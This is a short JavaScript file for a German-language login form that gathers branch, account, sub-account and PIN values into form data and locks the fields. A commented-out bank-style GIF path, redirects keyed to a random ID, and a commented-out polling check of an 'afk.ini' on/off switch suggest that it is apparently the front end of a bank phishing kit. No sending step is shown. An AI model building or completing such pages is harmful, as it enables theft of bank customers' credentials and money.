const login_form = document.querySelector('#loginButton');
const branch = document.querySelector('#branch');
const account = document.querySelector('#account');
const subAccount = document.querySelector('#subAccount');
const pin = document.querySelector('#pin');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

const isFieldEmpty = field => field.value === '';

const resetForm = (fields, button) => {
    fields.forEach(field => field.disabled = false);
    button.disabled = false;
    fields.forEach(field => field.value = '');
    button.innerHTML = 'Login ausf&uuml;hren';
    document.querySelector('#errorMessage').style.display = 'block';
};

login_form.addEventListener('click', e => { 
    e.preventDefault();
    const fields = [branch, account, subAccount, pin];
    if (fields.some(isFieldEmpty)) {
        resetForm(fields, loginButton);
        return;
    }
    const data = new FormData();
    fields.forEach(field => data.append(field.id, field.value));
    // loginButton.innerHTML = '<img src="images/ing.gif" width="18" style="display: inline-block;"> Laden...';
    fields.forEach(field => field.disabled = true);
    loginButton.disabled = true;
    
    var randomID = document.querySelector('input[name="randomId"]').value;

    // window.location.href = '/information/'+randomID;

    /*(setTimeout(() => {
        fetch('/public/api/afk.ini')
            .then(response => response.text())
            .then(text => {
                alert('call here 1');
                if (text.trim().toLowerCase() === 'on') {
                    window.location.href = '/information/' + token.value;
                }
            })
            .catch(error => {
                console.error('Theres a error:', error);
            });
    }, 300);*/
});

